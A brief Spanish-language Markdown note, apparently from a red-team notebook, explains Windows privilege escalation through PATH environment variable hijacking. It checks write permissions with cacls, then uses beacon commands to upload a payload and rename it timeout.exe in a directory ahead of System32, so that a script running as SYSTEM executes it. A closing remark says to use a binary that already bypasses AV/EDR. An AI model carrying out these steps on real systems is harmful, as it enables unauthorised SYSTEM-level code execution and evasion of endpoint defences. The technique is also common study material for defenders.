---
tags: [privesc, windows, path]
---

# PATH Environment Variable Hijacking

Ocurre cuando un programa/servicio que corre como SYSTEM ejecuta un binario desde ruta relativa. Los instaladores añaden su propio PATH delante de los defaults.

```bash
# Ver permisos en el directorio del PATH
cacls C:\Python313\Scripts\
```

Si hay escritura en un directorio que aparece ANTES en el PATH que `System32`:

```
Path=C:\Python313\Scripts\;C:\Python313;C:\Windows\system32;...
```

```bash
# Plantar el binario malicioso con el mismo nombre
beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```

Al ejecutarse el script legítimo → busca `timeout.exe` en PATH → encuentra el nuestro primero → ejecución como SYSTEM.

> [!note]
> Insertar un binario que ya pase el AV/EDR.

